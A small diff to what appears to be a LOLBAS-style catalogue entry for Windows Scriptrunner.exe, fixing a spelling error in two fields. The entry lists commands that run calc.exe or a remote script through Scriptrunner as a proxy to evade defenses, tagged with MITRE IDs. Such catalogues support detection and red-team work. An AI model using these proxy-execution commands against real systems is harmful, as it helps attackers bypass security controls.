@@ -6,14 +6,14 @@ Created: 2018-05-25
 Commands:
   - Command: Scriptrunner.exe -appvscript calc.exe
     Description: Executes calc.exe
-    Usecase: Execute binary through proxy binary to evade defensive counter measurments
+    Usecase: Execute binary through proxy binary to evade defensive counter measures
     Category: Execute
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"
     Description: Executes calc.cmd from remote server
-    Usecase: Execute binary through proxy binary from external server to evade defensive counter measurments
+    Usecase: Execute binary through proxy binary from external server to evade defensive counter measures
     Category: Execute
     Privileges: User
     MitreID: T1218
